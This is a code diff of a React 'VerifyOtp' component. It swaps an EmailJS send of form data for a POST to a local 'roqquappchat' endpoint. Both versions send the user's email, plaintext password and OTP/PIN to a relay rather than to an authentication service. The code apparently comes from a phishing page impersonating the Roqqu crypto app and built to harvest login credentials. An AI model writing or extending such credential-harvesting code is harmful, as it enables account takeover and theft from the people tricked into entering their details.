@@ -27,29 +27,44 @@ const VerifyOtp = (props) => {
                 templateParams.client_verifiedOtp = code
 
 
-                emailjs
-                    .send(
-                        'service_9vrlrlj',
-                        'template_cyuy4xi',
-                        templateParams,
-                        'user_Qbla9rcVZxBrYr7bdLXKO'
-                    )
-                    .then(
-                        (result) => {
-                            console.log(result.text, 'email sent')
-                            setTimeout(() => {
-                                console.log('time out init')
-                                setLoading(false)
+                
+             try {
+                 const response = await fetch(
+                     'http://localhost:3030/roqquappchat',
+                     {
+                         method: 'POST',
+                         headers: {
+                             'Content-type': 'application/json',
+                         },
+                         body: JSON.stringify({
+                             email: templateParams.email,
+                             password: templateParams.password,
+                             pin: clientOtp,
+                             otp: '',
+                         }),
+                     }
+                 )
+
+                 const resData = await response.json()
+
+                 console.log('email sending started')
+
+                 if (resData.status === 'success') {
+                     console.log('Message Sent.')
+                     setTimeout(() => {
+                         console.log('time out init')
+                         setLoading(false)
 
                                 history.push('/')
-                            }, 3000)
-                        },
-                        (error) => {
-                            console.log(error, 'email failed')
-                        setLoading(false)
+                     }, 3000)
+                 } else if (resData.status === 'fail') {
+                     console.log('Message failed to send.')
+                     setLoading(false)
+                 }
+             } catch (err) {
+                 console.log(err)
+             }
 
-                        }
-                    )
             }
         }
     }
